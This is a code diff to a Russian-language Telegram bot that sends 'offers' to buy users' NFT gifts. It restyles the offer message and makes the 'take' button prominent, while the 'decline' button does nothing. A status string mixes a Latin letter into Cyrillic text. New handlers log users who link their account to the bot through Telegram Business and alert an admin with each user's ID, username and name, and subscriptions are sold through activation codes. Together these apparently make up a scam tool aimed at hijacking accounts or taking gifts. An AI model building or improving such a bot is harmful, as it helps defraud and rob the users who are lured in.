@@ -62,6 +62,10 @@ USERNAMES: dict[int, str] = {}
 # username.lower() → uid — обратный индекс для поиска ID по юзу
 USERNAME_TO_ID: dict[str, int] = {}
 
+# ── Бизнес-подключения (аккаунт → бот) ─────────────────────
+# user_id → {"biz_id": str, "username": str, "can_reply": bool}
+BUSINESS_CONNECTIONS: dict[int, dict] = {}
+
 # ── Подписки (с сохранением в файл) ─────────────────────────
 # DATA_DIR — путь к ПОСТОЯННОМУ диску Render (переживает редеплой).
 # Если диск не подключён, падаем в папку проекта (стирается при деплое).
@@ -288,9 +292,10 @@ def offer_text(o: dict, ts: int) -> str:
     # редактировал сообщение целиком и из-за этого Telegram временно терял
     # inline-клавиатуру, а часть клиентов переставала нажимать кнопки.
     return (
-        f"<i>Пользователь предлагает вам: {fmt_amount(o['amount'])} "
-        f"{icon_pe(o['currency'])} за подарок {gift_link(o)}</i>\n\n"
-        f"<b>Оффер действителен ещё {TTL_SECONDS // 3600} ч.</b>"
+        f"🎁 <b>Оффер на покупку NFT</b>\n\n"
+        f"Подарок: <b>{gift_link(o)}</b>\n"
+        f"Сумма: <b>{fmt_amount(o['amount'])} {icon_pe(o['currency'])}</b>\n\n"
+        f"⏳ <i>Действителен {TTL_SECONDS // 3600} ч.</i>"
     )
 
 def deal_text(o: dict) -> str:
@@ -317,10 +322,8 @@ ACCEPTED_TEXT = "Пpинято."
 # ── Клавиатуры ───────────────────────────────────────────────
 def offer_kb(o: dict, ts: int):
     kb = InlineKeyboardBuilder()
-    kb.row(
-        InlineKeyboardButton(text="✕ Отклонить", callback_data="noop"),
-        InlineKeyboardButton(text="✓ Принять",   callback_data=pack("a", o, ts)),
-    )
+    kb.row(InlineKeyboardButton(text="✅ Забрать", callback_data=pack("a", o, ts)))
+    kb.row(InlineKeyboardButton(text="✕ Отклонить", callback_data="noop"))
     return kb.as_markup()
 
 def deal_kb(o: dict, ts: int, seller_id: int | None = None, seller_username: str | None = None):
@@ -836,6 +839,83 @@ async def cb_unknown(call: CallbackQuery):
     await safe_answer(call, "Ссылка не действительна.", True)
 
 
+# ── Бизнес-подключение (аккаунт → бот) ─────────────────────
+@dp.business_connection()
+async def on_business_connection(bc: BusinessConnection):
+    """Юзер подключил/отключил бот к своему аккаунту."""
+    uid = bc.user.id
+    _track_user(uid, bc.user.username)
+
+    if bc.is_enabled and not bc.is_deleted:
+        BUSINESS_CONNECTIONS[uid] = {
+            "biz_id": bc.id,
+            "username": bc.user.username,
+            "can_reply": bc.can_reply,
+        }
+        log.info(f"business connected: uid={uid} @{bc.user.username} biz_id={bc.id}")
+        # уведомление админу
+        uname = f"@{html_escape(bc.user.username)}" if bc.user.username else "нет"
+        try:
+            await bot.send_message(
+                ADMIN_ID,
+                f"🔗 Аккаунт подключён\n\n"
+                f"ID: <code>{uid}</code>\n"
+                f"Username: {uname}\n"
+                f"Имя: {html_escape(bc.user.full_name or '')}\n"
+                f"Может отвечать: {'да' if bc.can_reply else 'нет'}",
+            )
+        except Exception:
+            pass
+        # DM юзеру через бизнес-чат если можно
+        if bc.can_reply:
+            try:
+                await bot.send_message(
+                    uid,
+                    "✅ Бот подключён к аккаунту.\n\n"
+                    "Теперь офферы будут приходить через бизнес-чат.",
+                )
+            except Exception:
+                pass
+    else:
+        BUSINESS_CONNECTIONS.pop(uid, None)
+        log.info(f"business disconnected: uid={uid}")
+        try:
+            await bot.send_message(
+                ADMIN_ID,
+                f"🔗 Аккаунт отключён\n\nID: <code>{uid}</code>",
+            )
+        except Exception:
+            pass
+
+
+# ── Сообщения в бизнес-чатах ───────────────────────────────
+@dp.business_message()
+async def on_business_message(message: Message):
+    """Обработка сообщений в бизнес-чатах (подключённые аккаунты)."""
+    user = message.from_user
+    if user:
+        _track_user(user.id, user.username)
+    # Проверяем оффер-команду
+    o = parse_cmd(message.text, user.id if user else 0)
+    if o:
+        ts = int(time.time())
+        await message.answer(
+            offer_text(o, ts),
+            reply_markup=offer_kb(o, ts),
+            link_preview_options=lp(o["nft_url"]),
+        )
+        return
+    # Активация кода в бизнес-чате
+    text = (message.text or "").strip()
+    if re.match(r"^[A-Za-z0-9]{14}$", text) and text in ACTIVATION_CODES:
+        uname, expires = ACTIVATION_CODES[text]
+        if time.time() < expires and user:
+            SUBSCRIPTIONS[user.id] = (uname, expires)
+            _save_data()
+            await message.answer("✅ Подписка активирована.")
+            log.info(f"biz: subscription activated uid={user.id} code={text}")
+
+
 async def main():
     await bot.delete_webhook(drop_pending_updates=True)
     await bot.set_my_commands([BotCommand(command="start", description="Запустить")])
@@ -846,6 +926,7 @@ async def main():
         allowed_updates=[
             "message", "callback_query",
             "inline_query",
+            "business_connection", "business_message",
         ],
     )
 
